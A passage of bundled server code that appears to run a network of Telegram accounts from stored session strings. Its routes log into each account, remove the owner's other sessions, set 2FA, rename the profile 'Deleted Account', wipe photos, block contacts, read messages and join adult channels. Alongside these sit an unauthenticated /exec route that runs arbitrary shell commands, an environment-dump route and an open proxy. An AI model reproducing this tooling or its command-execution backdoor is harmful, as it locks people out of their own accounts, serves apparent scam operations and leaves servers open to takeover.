  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('2')) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}exit`);
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(40000)
    }
  }
});

app.get('/connectclient2/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (user) {
    const buttonHtml = `<button id='btn' style="width: 50vw; height: 30vw; border-radius:20px;font-size:4vh"  onclick="triggerHtmlRequest('${user.mobile}', '${user.session}')">Create Client</button>
    <script>
      function triggerHtmlRequest(mobile, session) {
        console.log(${number})
        const button = document.getElementById('btn')
        const request = new XMLHttpRequest();
        request.open('GET', '${process.env.uptimeChecker}/cc/' + ${number}, true);
        request.onload = function() {
          if (request.status >= 200 && request.status < 400) {
            button.innerHTML = request.responseText;
          } else {
            console.error('Failed to fetch URL');
          }
        };
        request.send();
        }
    </script>`
    res.send(`<html><body style="justify-content: center; display: flex;align-items:center;font-size:5vh"><b style="display:block"><h6>User Exists</h6>${buttonHtml}</b></body></html>`);
  } else {
    res.send("<html><body style='justify-content: center; display: flex;align-items:center;font-size:5vh'>User Does not exist</body></html>");
  }
});

// Second API to create the client when the button is clicked
app.get('/cc/:number', async (req, res) => {
  const number = req.params?.number;
    console.log("In createclient - ", req.ip);
    const cli = _nest_components_Telegram_Telegram_service__WEBPACK_IMPORTED_MODULE_16__.TelegramService.createClient(number)
    if (cli) {
      res.send("client created");
    } else {
      res.send("client EXPIRED");
    }
});


app.get('/connectclient/:number', async (req, res) => {
  const number = req.params?.number;
  const user = (await usersService.search({ mobile: number }))[0]
  console.log(user);
  if (user) {
      console.log("In connectclient - ", req.ip)
      const cli = await _nest_components_Telegram_Telegram_service__WEBPACK_IMPORTED_MODULE_16__.TelegramService.createClient(user.mobile, user.session);
      if (cli) {
        res.send("client created");
      } else {
        res.send("client EXPIRED");
      }
  } else {
    res.send("User Does not exist");
  }
});

app.get('/sendToChannel', async (req, res, next) => {
  res.send("sendToChannel");
  next();
}, async (req, res) => {
  try {
    const message = req.query?.msg;
    const chatId = req.query?.chatId;
    const token = req.query?.token;
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot(chatId, token)}&text=${decodeURIComponent(message)}`, {}, 3)
  } catch (e) {
    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(e));
  }
})

app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
  res.send("joiningChannels");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const limit = req.params.limit ? req.params.limit : 30
    const skip = req.params.skip ? req.params.skip : 20
    const k = req.query?.k
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      console.log("In joinchannels")
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session, false);
      if (cli) {
        const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
        const channels = await client.channelInfo(true);
        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
        console.log("DbChannelsLen: ", result.length);
        let resp = '';
        for (const channel of result) {

          resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
        }
        await client.removeOtherAuths();
        client.joinChannels(resp);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});

app.get('/set2fa/:number', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      console.log("In set2fa")
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.set2fa();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code)
  }
});

app.get('/setpp/:number/:name', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const name = req.params?.name;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      console.log("In setpp")
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await _cloudinary__WEBPACK_IMPORTED_MODULE_9__.CloudinaryService.getInstance(name);
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(2000);
        await client.updateProfilePic('./dp1.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
        await client.updateProfilePic('./dp2.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
        await client.updateProfilePic('./dp3.jpg');
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code)
  }
});


app.get('/SetAsBufferClient/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.set2fa();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(30000)
        await client.updateUsername();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.updatePrivacyforDeletedAccount();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.updateProfile("Deleted Account", "Deleted Account");
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
        await client.deleteProfilePhotos();
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000)
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});

app.get('/updatePrivacy/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updatePrivacy();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});

app.get('/forward*', async (req, res) => {
  let targetHost = 'https://ramyaaa.onrender.com';
  if (req.query.host) {
    targetHost = req.query.host;
  }
  try {
    console.log(req.url);
    const finalUrl = `${targetHost}${req.url.replace('/forward', '')}`
    console.log("final:", finalUrl)
    const response = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(finalUrl)
    res.status(response?.status).send(response?.data);
  } catch (error) {
    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error))
    res.status(500).send('Internal Server Error');
  }
});

app.get('/UpdateUsername/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const username = req.query?.username;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updateUsername(username);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});

app.get('/UpdateName/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.updateProfile("Deleted Account", "Deleted Account");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});


app.get('/deletepp/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
      if (cli) {
        await client.deleteProfilePhotos();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
  }
});

app.get('/removeAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      await client.removeOtherAuths();
      res.send("Auths Removed");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/exec/:cmd', async (req, res, next) => {
  let cmd = req.params.cmd;
  console.log(`executing: `, cmd);
  try {
    res.send(console.log((0,child_process__WEBPACK_IMPORTED_MODULE_8__.execSync)(cmd).toString()));
  } catch (error) {
    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error))
  }
});

app.get('/blockusers/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      await client.blockAllUsers();
      res.send("Blocked Users");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/getAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
    const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
    const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
    if (client) {
      res.json(await client.getAuths());
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});


app.get('/connectcliens/:limit/:skip', async (req, res) => {
  const limit = req.params?.limit;
  const skip = req.params?.skip;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';

  for (const user of users) {
    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
      if (cli) {
        resp += `${user.mobile} : true\n\n`;
      } else {
        resp += `${user.mobile} : false\n\n`;
      }
    }
  }

  resp += '</pre></body></html>';

  console.log("data: ", resp);
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/disconnectclients', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.disconnectAll)();
});

app.get('/promoteStats', async (req, res, next) => {
  const resp = await getPromotionStatsHtml();
  res.setHeader('Content-Type', 'text/html');
  res.send(resp)
});


app.get('/getusers/:limit/:skip', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const users = await db.getUsers(limit, skip);
  res.json(users)
})

app.get('/getlastmsgs/:number/:limit', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const number = req.params?.number;
  console.log(number, limit);
  const clientobj = (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(number);
  await clientobj.client.connect();
  console.log(clientobj.client.connected);
  if (clientobj) {
    const result = await clientobj?.getLastMsgs(limit, number);
    res.send(result)
  } else {
    res.send("client is undefined");
  }

})

app.get('/getchannels', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${value.url}getchannels`);
    await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000);
  }
});

app.get('/restart', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userName = req.query.userName;
  const checker = checkerclass.getinstance()
  checker.restart(userName.toLowerCase());
});

app.get('/receiveNumber/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const num = parseInt(req.params.num);
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
  }
});

app.get('/disconnectUser', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${data.url}exit`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
  }
});

app.get('/tgclientoff/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const processId = req.params.num;
    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.ip, req.query.url, " : ", userName, ' - ', processId)

    try {
      const data = userMap.get(userName.toLowerCase());
      const url = data?.url;
      if (url) {
        const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}getprocessid`, { timeout: 10000 });
        if (connectResp.data.ProcessId === processId) {
          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
          pushToconnectionQueue(userName, processId)
        } else {
          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);
          console.log("Request received from Unknown process")
        }
      }
    } catch (error) {
      console.log("Some Error here: ", error.code)
    }

  } catch (error) {
    console.log("Some Error and here: ", error);
  }
});

app.get('/receive', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
      pings[userName.toLowerCase()] = Date.now();
      console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), userName, 'Ping!! Received!!')
    } else {
      console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
  }
});

const userAccessData = new Map();

app.get('/getenv', async (req, res) => {
  try {
    console.log(process.env)
  } catch (error) {
    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error))
  }
  res.send("hii");
});


app.get('/isRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  const accessData = userAccessData.get(chatId) || { timestamps: [], videoDetails: {} };
  const currentTime = Date.now();
  const recentAccessData = accessData?.timestamps?.filter(timestamp => currentTime - timestamp <= 15 * 60 * 1000);
  recentAccessData.push(currentTime);
  userAccessData.set(chatId, { videoDetails: accessData.videoDetails, timestamps: recentAccessData });
  res.send({ count: recentAccessData.length, videoDetails: accessData.videoDetails });
});

app.post('/isRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  let videoDetails = req.body;
  const accessData = userAccessData.get(chatId) || { timestamps: [], videoDetails: {} };
  videoDetails = { ...accessData.videoDetails, ...videoDetails }
  userAccessData.set(chatId, { videoDetails, timestamps: accessData.timestamps });
  res.send({ count: accessData.timestamps.length, videoDetails: videoDetails });
});

app.get('/resetRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  userAccessData.delete(chatId);
  res.send({ count: 0 });
});

app.get('/paymentstats', async (req, res) => {
  const chatId = req.query.chatId;
  const profile = req.query.profile;
  const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
  const resp = await db.checkIfPaidToOthers(chatId, profile);
  console.log(resp)
  res.send(resp)
})


const playbackPositions = new Map();

app.get('/video', (req, res) => {
  let vid = req.query.video || 1;
  const chatId = req.query.chatId
  if (playbackPositions.has(chatId)) {
    if ((playbackPositions.get(chatId) + (3 * 60 * 1000)) > Date.now() && vid == '2') {
      vid = "3"
    }
  }
  let filePath = `./video${vid}.mp4`;
  playbackPositions.set(chatId, Date.now());
  const stat = fs__WEBPACK_IMPORTED_MODULE_10___default().statSync(filePath);
  const fileSize = stat.size;

  const head = {
    'Content-Length': fileSize,
    'Content-Type': 'video/mp4',
  };

  res.writeHead(200, head);
  fs__WEBPACK_IMPORTED_MODULE_10___default().createReadStream(filePath).pipe(res);

});


app.get('/requestcall', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const chatId = req.query.chatId;
    const type = req.query.type;
    const user = userMap.get(userName.toLowerCase());
    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);
    console.log(`Call Request Recived: ${userName} | ${chatId}`)
    if (user) {
      const payload = { chatId, profile: user.clientId, type }
      const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        data: JSON.stringify(payload),
      };
      const result = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)("https://arpithared.onrender.com/events/schedule", options, 3);
      console.log("eventsResponse:", result?.data)
      // setTimeout(async () => {
      //   try {
      //     const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
      //     if (data.data) {
      //       console.log(`Call Request Sent: ${userName} | ${chatId}`)
      //       setTimeout(async () => {
      //         try {
      //           const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
      //           setTimeout(async () => {
      //             await fetchWithTimeout(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
      //           }, 3 * 60 * 1000);
      //         } catch (error) {
      //           console.log(parseError(error))
      //         }
      //       }, 2 * 60 * 1000);
      //     } else {
      //       console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);
      //     }
      //   } catch (error) {
      //     console.log("Failed", user);
      //   }

      // }, 3 * 60 * 1000);
    } else {
      console.log("USer not exist!!")
    }
  } catch (error) {
    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
  }
});

const nestApp = await _nestjs_core__WEBPACK_IMPORTED_MODULE_11__.NestFactory.create(_nest_app_module__WEBPACK_IMPORTED_MODULE_13__.AppModule, new _nestjs_platform_express__WEBPACK_IMPORTED_MODULE_12__.ExpressAdapter(app));
const config = new _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.DocumentBuilder()
  .setTitle('NestJS and Express API')
  .setDescription('API documentation')
  .setVersion('1.0')
  .build();
const document = _nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.SwaggerModule.createDocument(nestApp, config);
// fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
_nestjs_swagger__WEBPACK_IMPORTED_MODULE_14__.SwaggerModule.setup('api', nestApp, document);
mongoose__WEBPACK_IMPORTED_MODULE_15___default().set('debug', true)
await nestApp.init();
let usersService;
app.listen(port, async () => {
  usersService = new _nest_components_users_users_service__WEBPACK_IMPORTED_MODULE_17__.UsersService(mongoose__WEBPACK_IMPORTED_MODULE_15___default().model(_nest_components_users_schemas_user_schema__WEBPACK_IMPORTED_MODULE_18__.User.name, _nest_components_users_schemas_user_schema__WEBPACK_IMPORTED_MODULE_18__.UserSchema))
  console.log(`Example app listening at http://localhost:${port}`)
});

let startedConnecting = false;
class checkerclass {
  static instance = undefined;

  constructor() {
    this.main();
  };

  static getinstance() {
    if (!checkerclass.instance) {
      console.log('creating instance-------')
      checkerclass.instance = new checkerclass();
    }
    return checkerclass.instance;
  }
  main() {
    // setInterval(async () => {
    //     console.log('--------------------------------------------');
    //     userMap.forEach(async (val, key) => {
    //         try {
    //             const resp = await fetchWithTimeout(`${val.url}checkHealth`, { timeout: 10000 });
    //             if (resp.status === 200 || resp.status === 201) {
    //                 if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
    //                     console.log(resp.data.userName, ': All good');
    //                 } else {
    //                     console.log(resp.data.userName, ': DIAGNOSE - Checking Connection - ', resp.data.status);
    //                     await fetchWithTimeout(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:healthCheckError${resp.data.status}`);
    //                     try {
    //                         const connectResp = await fetchWithTimeout(`${val.url}tryToConnect`, { timeout: 10000 });
    //                         console.log(connectResp.data.userName, ': CONNECTION CHECK RESP - ', connectResp.data.status);
    //                         await fetchWithTimeout(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:retryResponse -${connectResp.data.status}`);
    //                     } catch (e) {
    //                         console.log(val.url, `CONNECTION RESTART FAILED!!`);
    //                     }
    //                 }
    //             } else {
    //                 console.log(val.url, `is unreachable!!`);
    //             }
    //         } catch (e) {
    //             console.log(val.url, `is unreachable!!`);
    //             //console.log(parseError(e))
    //         }
    //     })
    // }, 120000);

    setInterval(async () => {
      count++;
      // if (count % 4 == 0) {
      console.log(`-------------------------------------------------------------`)
      if (connetionQueue.length > 0 && !startedConnecting) {
        while (connetionQueue.length > 0) {
          startedConnecting = true;
          if (connetionQueue.length == 1) {
            startedConnecting = false;
          }
          const { userName, processId } = connetionQueue.shift();
          console.log('Starting - ', userName);
          try {
            const data = userMap.get(userName.toLowerCase());
            const url = data?.url;
            if (url) {
              const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}tryToConnect/${processId}`, { timeout: 10000 });
              console.log(connectResp.status)
            }
            setTimeout(async () => {
              try {
                const connectResp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}promote`);
              } catch (error) {
                console.log(error.code)
              }
              setTimeout(async () => {
                try {
                  const connectResp2 = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${url}markasread`);
                } catch (error) {
                  console.log(error.code)
                }
              }, 35000);
            }, 35000);
          } catch (error) {
            console.log("Some Error at coneect: ", error.code)
          }
          await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(5000);
        }
      }

      const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();

      for (const key of Array.from(userMap.keys())) {
        const val = userMap.get(key);
        if (val) {
          if ((Date.now() - pings[key]) > (5 * 60 * 1000) && (Date.now() - val.lastPingTime) > (5 * 60 * 1000)) {
            try {
              if ((Date.now() - pings[key]) > (7 * 60 * 1000) && (Date.now() - val.lastPingTime) > (7 * 60 * 1000)) {
                const url = val.url.includes('glitch') ? `${val.url}exit` : val.deployKey;
                console.log("trying url :", url)
                try {
                  await axios__WEBPACK_IMPORTED_MODULE_2___default().get(val.url);
                } catch (e) {
                  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(url, 3)
                  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=${val.clientId} : Not responding | url = ${url}`);
                }
              } else {
                await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=${val.clientId} : not responding - ${(Date.now() - val.lastPingTime) / 60000}`);
              }
            } catch (error) {
              await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=${val.clientId} : Url not responding`);
              console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
            }
          }

          if (val.downTime > 2) {
            console.log(val.clientId, " - ", val.downTime)
          }
          try {
            const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`${val.url}`, { timeout: 120000 });
            userMap.set(key, { ...val, downTime: 0 })
          } catch (e) {
            console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), val.url, ` NOT Reachable - ${val.downTime}`);
            userMap.set(key, { ...val, downTime: val.downTime + 1 })
            if (val.downTime > 5) {
              userMap.set(key, { ...val, downTime: -5 })
              try {
                const resp = await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${val.deployKey}`, { timeout: 120000 });
                if (resp?.status == 200 || resp.status == 201) {
                  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Restarted ${key}`);
                } else {
                  console.log(`Failed to Restart ${key}`);
                  await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Failed to Restart ${key}`);
                }
              } catch (error) {
                console.log(`Failed to Restart ${key}`);
                await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.fetchWithTimeout)(`${ppplbot()}&text=Failed to Restart ${key}`);
              }
            }
          }

          const userPromoteStats = await db.readSinglePromoteStats(val.clientId);
          if (userPromoteStats?.isActive && (Date.now() - userPromoteStats?.lastUpdatedTimeStamp) / (1000 * 60) > 12) {
            try {
              const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`${val.url}promote`, { timeout: 120000 });
            } catch (error) {
              console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code);
            }
          }
        } else {
          console.log(key, "- Does not exist");
          userMap.clear();
          await setUserMap()
        }
        await (0,_utils__WEBPACK_IMPORTED_MODULE_7__.sleep)(1000)
      }

      try {
        const resp = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://mychatgpt-pg6w.onrender.com/`, { timeout: 55000 });
